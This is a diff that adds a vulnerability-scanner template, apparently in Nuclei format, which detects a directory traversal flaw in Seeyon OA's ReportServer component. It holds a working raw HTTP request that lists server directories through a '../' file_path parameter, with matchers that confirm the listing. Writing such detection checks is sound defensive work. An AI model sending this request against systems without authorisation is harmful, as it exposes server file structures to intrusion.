@@ -1,0 +1,21 @@
+id: seeyon-oa-directory-traversal
+info:
+  name: Seeyon OA Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Directory traversal vulnerability in the Seeyon OA ReportServer component.
+http:
+  - raw:
+      - |
+        GET /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<Node isDir=\"true\" envPath=\""
+          - "<NODES xmlVersion=\""
